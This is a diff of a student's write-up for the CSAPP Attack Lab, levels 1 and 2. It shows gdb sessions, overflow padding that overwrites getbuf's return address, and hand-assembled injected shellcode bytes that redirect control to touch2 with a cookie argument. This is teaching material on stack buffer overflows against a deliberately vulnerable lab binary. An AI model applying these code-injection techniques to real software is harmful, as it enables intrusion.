@@ -1326,19 +1326,17 @@ Read section 3.12 and 3.12.1 of CSAPP 2e as reference material of this lab since
 
 If we type a long string, the bounds of arrays will be overrun. Whereas, we should not input meaningless strings to cause buffer overflow only, but do something more interesting. 
 
-##### Starting Attacks
-
-**Part I: Code Injection Attacks**
+##### **Part I: Code Injection Attacks**
 
 ###### Level 1  touch1
 
-To Call `touch1` when `getbuf()` returns instead of returning to the caller: `test()`.
+Task: To Call `touch1` when `getbuf()` returns instead of returning to the caller: `test()`.
 
-Tips: 
+**Tips:** 
 
-1. Find the "BUFFER_SIZE".
+1. Find the "BUFFER_SIZE".  (maximum 0x28)
 
-*Analyses:* 
+***Analyses:*** 
 
 The C code of `test()` in the ["attacklab.pdf".](.\labs\labs_of_CSAPP3e\3_Attack_Lab\attacklab.pdf) is as follows: 
 
@@ -1351,7 +1349,7 @@ The C code of `test()` in the ["attacklab.pdf".](.\labs\labs_of_CSAPP3e\3_Attack
 6 }
 ```
 
-(1) In order to test, I input `abcd` and let the program run to `0x4017ac` in `getbuf()`.
+(1) In order to test, I input `abcd` and let the program run to `0x4017af` in `getbuf()`.
 
 ```shell
 (gdb)
@@ -1379,8 +1377,8 @@ Here is the disassemble code of `test()` and `getbuf()`:
 
 00000000004017a8 <getbuf>:
   4017a8:	48 83 ec 28          	sub    $0x28,%rsp
-> 4017ac:	48 89 e7             	mov    %rsp,%rdi
-  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
+  4017ac:	48 89 e7             	mov    %rsp,%rdi
+> 4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
   4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
   4017b9:	48 83 c4 28          	add    $0x28,%rsp
   4017bd:	c3                   	retq   
@@ -1392,7 +1390,7 @@ When the program is running to `0x4017ac`, I examine the content at the address 
 (gdb)x/x ($rsp + 0x28)  # 0x401976
 ```
 
-`0x401976` is exactly the address where the instruction follows the call of `getbuf()` and it is what we are going to corrupt. 
+`0x401976` is exactly the address where the instruction follows the call of `getbuf()`; the instruction at `0x4017bd c3 	retq` will return here and it is what we are going to corrupt. 
 
 (2) Since in `getbuf()` the stack pointer `%rsp` is decreased by `0x28` which is 40, I modify my input with 10 lines of `61 62 63 64`  in `exploit.txt`. 
 
@@ -1435,5 +1433,193 @@ Hence, I input the return address of `touch1` in the line of 11. Note the order 
 
 Great! It called `touch1`. 
 
+###### Level 2 touch2
 
+**Tips:** 
+
+> 1. The address of the first instruction of `touch2` is `0x4017ec`.
+> 2. Conventionally, the first argument of a function is stored in `%rdi`  for x86-64 or `%edi`  for IA32.
+> 3. Review how `ret` is executed so that we can know how to transfer control to `touch2` in our exploit code. 
+
+***Analyses***
+
+(1) How can I have injected code called ? 
+
+The first sentence of the introduction said, "Phase 2 involves injecting a small amount of code as part of your exploit string. "  
+
+It seems that I can write some assembly as part of the input string and then replace the return address in `getbuf` with the position of my assembly code. Then in my exploited code, use `ret` to transfer control to `touch2` and pass arguments to it. 
+
+Hence, since my input string is stored in the current stack of `getbuf` and they have addresses, I can overwrite the return address of `getbuf` with the position of my exploit code. 
+
+(2) To test, I only replace the return address in `getbuf` with the position of `touch2` without any injected code.
+
+```txt
+  1 61 62 63 64   /* a b c d */
+  2 61 62 63 64
+  3 61 62 63 64
+  4 61 62 63 64
+  5 61 62 63 64
+  6 61 62 63 64
+  7 61 62 63 64
+  8 61 62 63 64
+  9 61 62 63 64
+ 10 61 62 63 64
+ 11 ec 17 40 00   /* the return address of touch2 */
+```
+
+2.1) Then I found that my cookie value had been already loaded to `0x6044e4`. 
+
+```assembly
+00000000004017ec <touch2>:
+  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
+  4017f0:	89 fa                	mov    %edi,%edx
+  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
+  4017f9:	00 00 00 
+> 4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
+  401802:	75 20                	jne    401824 <touch2+0x38>
+  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
+# ...
+```
+
+```shell
+(gdb) x /wx 0x6044e4
+0x6044e4 <cookie>:      0x59b997fa  # It is exactly the value of that in "cookie.txt". 
+```
+
+2.2) Whereas, when the instruction at `0x4017fc` was being executed, I examined the content in `0x202ce2(%rip)` and found it was another: ` 0x2f8a0000`.  I am confused. See 3.5.
+
+```shell
+(gdb) x /wx ($rip + 0x202ce2)
+0x6044de <vlevel+2>:    0x2f8a0000
+```
+
+(3)  The next step is to inject my exploit code as an input string. 
+
+3.1) Convert instructions to byte sequence with `objdump`.
+
+Here is my exploit code. 
+
+```assembly
+# Hand-generated assembly for the level 2.
+mov  0x59b997fa, %rdi  # Pass my cookie in %rdi  !! The assembly is wrong.
+pushq 0x4017ec  # The position of "touch2"  	 !! Immediate operands should be with $.
+retq
+
+# The correct code: 
+mov  $0x59b997fa, %rdi  # Don't forget "$" before immediate operands.
+pushq $0x4017ec
+retq
+```
+
+Then generate the byte code with the correct assembly code. 
+
+```shell
+gcc -c assem_level2.s
+objdump -d assem_level2.o > assem_level2.d	
+```
+
+```assembly
+assem_lv2.o:     file format elf64-x86-64
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+    0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi 
+    7:   68 ec 17 40 00          pushq  $0x4017ec
+    c:   c3                      retq
+```
+
+Omit extraneous values and add some comments. 
+
+```assembly
+/* The following byte code is wrong due to incorrect assembly code!! I don't delete them to warn me when I review this lab. */
+48 8b 3c 25 fa 97 b9    /*  mov  0x59b997fa,%rdi */  
+59
+ff 34 25 ec 17 40 00    /* pushq  0x4017ec  */
+c3                      /* retq */
+
+/* The correct byte code  */
+48 c7 c7 fa 97 b9 59    /* mov $0x59b997fa,%rdi  */
+68 ec 17 40 00          /* pushq  $0x4017ec */ 
+c3                      /* retq */
+```
+
+Combine the bytes with the input string and save them as `exploit_lv2.txt `.
+
+```assembly
+  1 48 c7 c7 fa		
+  2 97 b9 59 68
+  3 ec 17 40 00
+  4 c3 00 00 00		/* Replace 61,.. with 0s to avoid misbehivour  */
+  5 00 00 00 00
+  6 00 00 00 00
+  7 00 00 00 00
+  8 00 00 00 00
+  9 00 00 00 00
+ 10 00 00 00 00
+ 11 78 dc 61 55     /* The top of current stack, which is the position of my exploit code in the current stack  */
+```
+
+3.2) Convert it to characters.
+
+```shell
+Linux> ./hex2raw < ./part_1/exploit_lv2.txt > ./part_1/exploit_lv2_raw.txt
+```
+
+3.3) Then redirect the input file to `ctarget` in `gdb`.
+
+```shell
+(gdb)start -q < ./part_1/exploit_lv2_raw.txt
+```
+
+3.4) The content in `%rsp` is `0x5561dc78`. Run the program to `getbuf`.
+
+```assembly
+00000000004017a8 <getbuf>:
+  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
+  4017ac:	48 89 e7             	mov    %rsp,%rdi
+  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
+> 4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
+  4017b9:	48 83 c4 28          	add    $0x28,%rsp
+  4017bd:	c3                   	retq   
+```
+
+When the instruction at `0x4017b4` is going to be executed, I examine the memory in `$rsp`.  Since the machine is little-endian, I thought I should adjust the order of bytes. Whereas, after disassembling the instructions in `%rsp`, the byte code is interpreted correctly. 
+
+```shell
+(gdb) x/wx $rsp
+0x5561dc78:     0xfac7c748
+(gdb) x/i $rsp
+   0x5561dc78:  mov    $0x59b997fa,%rdi   # It is exactly the assembly I write. 
+```
+
+To understand the byte sequences and how the machine reads them, let's find the first byte of `%rsp`. Apparently, the byte ordering is as same as that in my exploit byte code. Since it is a little-endian machine, the 4-byte word is displayed from the most significant byte to the least. Hence,  `fa` is not stored at `0x5561dc78`. 
+
+```shell
+(gdb) x/1xb $rsp
+0x5561dc78:     0x48
+(gdb) x/1xb ($rsp + 1)
+0x5561dc79:     0xc7
+```
+
+3.5) Tackle the confusion in 2.2.
+
+```assembly
+00000000004017ec <touch2>:
+  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
+  4017f0:	89 fa                	mov    %edi,%edx
+  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
+  4017f9:	00 00 00 
+  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
+> 401802:	75 20                	jne    401824 <touch2+0x38>
+  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
+  
+#######
+(gdb) x/wx ($rip + 0x202ce2)
+0x6044e4 <cookie>:      0x59b997fa
+```
+
+When the instruction at `0x401802` is being executed, the content in `0x202ce2(%rip)` is `$0x59b997fa`, my cookie. `%rip` as the PC is constantly changed. 
+
+Ah ! At last, the solution is valid. Great !
 
